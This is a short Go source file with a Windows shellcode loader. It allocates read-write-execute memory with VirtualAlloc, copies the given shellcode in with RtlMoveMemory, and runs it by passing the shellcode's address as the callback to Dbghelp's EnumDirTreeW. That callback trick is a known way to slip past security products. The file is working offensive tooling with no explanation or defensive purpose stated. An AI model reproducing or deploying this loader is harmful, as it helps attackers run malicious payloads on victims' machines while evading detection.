package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
	dummy [522]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	TRUE                   = 1
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	Dbghelp           = syscall.MustLoadDLL("Dbghelp.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentProcess = kernel32.MustFindProc("GetCurrentProcess")
	SymInitialize     = Dbghelp.MustFindProc("SymInitialize")
	EnumDirTreeW      = Dbghelp.MustFindProc("EnumDirTreeW")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	Process, _, _ := GetCurrentProcess.Call()
	SymInitialize.Call(Process, 0, TRUE)
	p1, _ := syscall.UTF16PtrFromString("C:\\\\Windows")
	p2, _ := syscall.UTF16PtrFromString("*.log")
	EnumDirTreeW.Call(Process, (uintptr)(unsafe.Pointer(p1)), (uintptr)(unsafe.Pointer(p2)), (uintptr)(unsafe.Pointer(&dummy)), addr, 0)
}

